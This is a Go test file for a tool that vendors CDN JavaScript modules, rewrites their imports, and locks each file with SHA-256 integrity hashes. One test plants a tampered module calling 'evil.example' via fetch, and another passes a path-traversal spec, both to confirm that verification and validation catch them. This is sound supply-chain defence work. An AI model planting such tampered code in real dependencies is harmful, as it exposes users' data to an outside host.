package jspin_test

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/alternayte/gx/internal/jspin"
)

// cdn serves builds in the form of the jsDelivr +esm address: one module
// for each package, with its dependencies as /npm/<pkg>@<version>/+esm.
func cdn(t *testing.T) (*httptest.Server, *[]string) {
	t.Helper()
	files := map[string]string{
		"/npm/chartlib@1.2.0/+esm":         "/**\n * Bundled by the CDN.\n * Original file: /npm/chartlib@1.2.0/index.js\n */\nimport{scale as s}from\"/npm/scale@2.0.0/+esm\";import\"/npm/@acme/theme@0.3.1/+esm\";export{palette}from'/npm/@acme/theme@0.3.1/dark/+esm';export const chart=(n)=>\"chart:\"+s(n);export default chart;\n//# sourceMappingURL=/sm/abc.map\n",
		"/npm/scale@2.0.0/+esm":            "export const scale=(n)=>n*2;\n//# sourceMappingURL=/sm/def.map\n",
		"/npm/@acme/theme@0.3.1/+esm":      "import{scale}from\"/npm/scale@2.0.0/+esm\";globalThis.themed=scale(1);\n",
		"/npm/@acme/theme@0.3.1/dark/+esm": "export const palette=[\"#000\"];export const load=()=>import(\"/npm/scale@2.0.0/+esm\");\n",
		"/npm/chartlib@1.2.0/core/+esm":    "export const core=\"core\";\n",
		// The next version of chartlib: a new scale, the same theme, and no
		// import of the dark palette.
		"/npm/chartlib@1.3.0/+esm": "import{scale as s}from\"/npm/scale@2.1.0/+esm\";import\"/npm/@acme/theme@0.3.1/+esm\";export const chart=(n)=>\"chart3:\"+s(n);export default chart;\n",
		"/npm/scale@2.1.0/+esm":    "export const scale=(n)=>n*3;\n",
	}
	var mu sync.Mutex
	var hits []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		hits = append(hits, r.URL.Path)
		mu.Unlock()
		body, ok := files[r.URL.Path]
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/javascript")
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(srv.Close)
	return srv, &hits
}

func read(t *testing.T, dir, rel string) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(rel)))
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func TestREQ_ISL_07_PinVendorsThePackageAndItsImports(t *testing.T) {
	srv, hits := cdn(t)
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "gx.lock"), []byte("{\n  \"tailwind\": {\"version\": \"v4.3.3\"}\n}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: "chartlib@1.2.0", BaseURL: srv.URL})
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"js/vendor/@acme/theme@0.3.1.js",
		"js/vendor/@acme/theme@0.3.1/dark.js",
		"js/vendor/chartlib@1.2.0.js",
		"js/vendor/scale@2.0.0.js",
	}
	if res.Specifier != "chartlib" || res.Version != "1.2.0" || strings.Join(res.Files, " ") != strings.Join(want, " ") {
		t.Fatalf("result = %+v", res)
	}
	// Each module is fetched one time, also when two modules import it.
	if len(*hits) != 4 {
		t.Fatalf("requests = %v, want four", *hits)
	}

	// The imports name the vendored files, and the source map line is gone.
	entry := read(t, dir, "js/vendor/chartlib@1.2.0.js")
	for _, part := range []string{`from"./scale@2.0.0.js"`, `import"./@acme/theme@0.3.1.js"`, `from'./@acme/theme@0.3.1/dark.js'`} {
		if !strings.Contains(entry, part) {
			t.Errorf("the entry lacks %s:\n%s", part, entry)
		}
	}
	if strings.Contains(entry, "sourceMappingURL") || strings.Contains(entry, `"/npm/`) {
		t.Errorf("the entry keeps a CDN address:\n%s", entry)
	}
	if got := read(t, dir, "js/vendor/@acme/theme@0.3.1.js"); !strings.Contains(got, `from"../scale@2.0.0.js"`) {
		t.Errorf("the scoped module = %s", got)
	}
	if got := read(t, dir, "js/vendor/@acme/theme@0.3.1/dark.js"); !strings.Contains(got, `import("../../scale@2.0.0.js")`) {
		t.Errorf("the subpath module = %s", got)
	}

	// gx.lock holds the pin and the integrity of each file, and keeps its
	// other sections.
	var lock struct {
		Tailwind struct{ Version string }
		JS       jspin.Lock
	}
	if err := json.Unmarshal([]byte(read(t, dir, "gx.lock")), &lock); err != nil {
		t.Fatal(err)
	}
	if lock.Tailwind.Version != "v4.3.3" {
		t.Fatalf("the tailwind section is gone: %s", read(t, dir, "gx.lock"))
	}
	if pin := lock.JS.Pins["chartlib"]; pin.Version != "1.2.0" || pin.File != "js/vendor/chartlib@1.2.0.js" {
		t.Fatalf("pin = %+v", pin)
	}
	if len(lock.JS.Files) != 4 {
		t.Fatalf("files = %v", lock.JS.Files)
	}
	for file, sum := range lock.JS.Files {
		if !strings.HasPrefix(sum, "sha256-") || len(sum) != len("sha256-")+44 {
			t.Errorf("integrity of %s = %q", file, sum)
		}
	}
	if err := jspin.Verify(dir, lock.JS); err != nil {
		t.Fatal(err)
	}
	if got := read(t, dir, "js/vendor/pins.d.ts"); !strings.Contains(got, `declare module "chartlib";`) {
		t.Fatalf("pins.d.ts = %s", got)
	}

	// A subpath is its own pin, and a second pin keeps the first.
	if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: "chartlib@1.2.0/core", BaseURL: srv.URL}); err != nil {
		t.Fatal(err)
	}
	again, err := jspin.LoadLock(dir)
	if err != nil {
		t.Fatal(err)
	}
	if again.Pins["chartlib/core"].File != "js/vendor/chartlib@1.2.0/core.js" || again.Pins["chartlib"].Version != "1.2.0" || len(again.Files) != 5 {
		t.Fatalf("lock after the second pin = %+v", again)
	}
	types := read(t, dir, "js/vendor/pins.d.ts")
	if !strings.Contains(types, `declare module "chartlib";`) || !strings.Contains(types, `declare module "chartlib/core";`) {
		t.Fatalf("pins.d.ts = %s", types)
	}
}

// A changed or missing vendored file stops the build (SI-10).
func TestREQ_ISL_07_VerifyFindsAChangedFile(t *testing.T) {
	srv, _ := cdn(t)
	dir := t.TempDir()
	if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: "chartlib@1.2.0", BaseURL: srv.URL}); err != nil {
		t.Fatal(err)
	}
	lock, _ := jspin.LoadLock(dir)
	file := filepath.Join(dir, "js", "vendor", "scale@2.0.0.js")
	if err := os.WriteFile(file, []byte("export const scale=(n)=>fetch('https://evil.example/'+n);\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	err := jspin.Verify(dir, lock)
	if err == nil || !strings.Contains(err.Error(), "js/vendor/scale@2.0.0.js does not match gx.lock") {
		t.Fatalf("Verify = %v", err)
	}
	if err := os.Remove(file); err != nil {
		t.Fatal(err)
	}
	err = jspin.Verify(dir, lock)
	if err == nil || !strings.Contains(err.Error(), "not on the disk") {
		t.Fatalf("Verify with a missing file = %v", err)
	}
}

// A pin that fails writes nothing.
func TestREQ_ISL_07_FailedPinLeavesTheAppUnchanged(t *testing.T) {
	srv, _ := cdn(t)
	dir := t.TempDir()
	for _, spec := range []string{"missing@1.0.0", "chartlib", "chartlib@", "../x@1.0.0", "Chart Lib@1"} {
		if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: spec, BaseURL: srv.URL}); err == nil {
			t.Errorf("Pin(%q) passed", spec)
		}
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 0 {
		t.Fatalf("a failed pin wrote %v", entries)
	}
}

// The esm mirror of gx.toml replaces the CDN (REQ-STY-12).
func TestREQ_ISL_07_MirrorFromConfig(t *testing.T) {
	srv, hits := cdn(t)
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "gx.toml"), []byte("[mirrors]\nesm = \""+srv.URL+"/\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: "scale@2.0.0"}); err != nil {
		t.Fatal(err)
	}
	if len(*hits) != 1 || (*hits)[0] != "/npm/scale@2.0.0/+esm" {
		t.Fatalf("requests = %v", *hits)
	}
}

func exists(dir, rel string) bool {
	_, err := os.Stat(filepath.Join(dir, filepath.FromSlash(rel)))
	return err == nil
}

// A pin of a new version of a package removes the files of the old version
// and their entries of gx.lock. A file that a different pin still uses
// stays (F-54).
func TestREQ_ISL_07_NewVersionRemovesTheOldVersion(t *testing.T) {
	srv, _ := cdn(t)
	dir := t.TempDir()
	pin := func(spec string) {
		t.Helper()
		if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: spec, BaseURL: srv.URL}); err != nil {
			t.Fatal(err)
		}
	}
	pin("chartlib@1.2.0")
	pin("chartlib@1.2.0/core")
	pin("chartlib@1.3.0")

	lock, err := jspin.LoadLock(dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := lock.Pins["chartlib"]; got.Version != "1.3.0" || got.File != "js/vendor/chartlib@1.3.0.js" {
		t.Fatalf("pin = %+v", got)
	}
	want := map[string]bool{
		// The new version and its imports.
		"js/vendor/chartlib@1.3.0.js":    true,
		"js/vendor/scale@2.1.0.js":       true,
		"js/vendor/@acme/theme@0.3.1.js": true,
		// The theme imports the old scale.
		"js/vendor/scale@2.0.0.js": true,
		// The pin of the subpath keeps its version.
		"js/vendor/chartlib@1.2.0/core.js": true,
		// Only the old version used these.
		"js/vendor/chartlib@1.2.0.js":         false,
		"js/vendor/@acme/theme@0.3.1/dark.js": false,
	}
	for file, keep := range want {
		if _, inLock := lock.Files[file]; inLock != keep {
			t.Errorf("gx.lock holds %s = %v, want %v", file, inLock, keep)
		}
		if exists(dir, file) != keep {
			t.Errorf("%s is on the disk = %v, want %v", file, exists(dir, file), keep)
		}
	}
	if len(lock.Files) != 5 {
		t.Errorf("files of gx.lock = %v", lock.Files)
	}
	// A directory with no file left is gone; a directory with a file stays.
	if exists(dir, "js/vendor/@acme/theme@0.3.1") {
		t.Error("the empty directory of the old subpath module stays")
	}
	if !exists(dir, "js/vendor/chartlib@1.2.0") {
		t.Error("the directory of the pinned subpath is gone")
	}
	if err := jspin.Verify(dir, lock); err != nil {
		t.Fatal(err)
	}

	// A new version of scale as a pin of its own: the theme still imports
	// the old file, so it stays.
	pin("scale@2.0.0")
	pin("scale@2.1.0")
	lock, _ = jspin.LoadLock(dir)
	if _, ok := lock.Files["js/vendor/scale@2.0.0.js"]; !ok || !exists(dir, "js/vendor/scale@2.0.0.js") {
		t.Error("the old scale is gone, and the theme imports it")
	}
	if err := jspin.Verify(dir, lock); err != nil {
		t.Fatal(err)
	}
}

// The verify step checks the entry file of each pin: a pin whose file has
// no hash in gx.lock stops the build, because the bundle would hold a file
// that no hash covers (SI-10, F-54).
func TestSI_10_VerifyChecksTheEntryFileOfEachPin(t *testing.T) {
	srv, _ := cdn(t)
	dir := t.TempDir()
	if _, err := jspin.Pin(context.Background(), jspin.Options{Dir: dir, Spec: "chartlib@1.2.0", BaseURL: srv.URL}); err != nil {
		t.Fatal(err)
	}
	lock, _ := jspin.LoadLock(dir)
	if err := jspin.Verify(dir, lock); err != nil {
		t.Fatal(err)
	}
	// The entry file is on the disk, and the lock has no hash for it.
	delete(lock.Files, "js/vendor/chartlib@1.2.0.js")
	err := jspin.Verify(dir, lock)
	if err == nil || !strings.Contains(err.Error(), `the pin "chartlib"`) || !strings.Contains(err.Error(), "js/vendor/chartlib@1.2.0.js") {
		t.Fatalf("Verify with an entry file that has no hash = %v", err)
	}
	// A pin that names a file outside the vendored files.
	lock, _ = jspin.LoadLock(dir)
	if err := os.WriteFile(filepath.Join(dir, "js", "other.js"), []byte("export default 1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	lock.Pins["other"] = jspin.Entry{Version: "1.0.0", File: "js/other.js"}
	if err := jspin.Verify(dir, lock); err == nil || !strings.Contains(err.Error(), `the pin "other"`) {
		t.Fatalf("Verify with a pin of an unknown file = %v", err)
	}
}
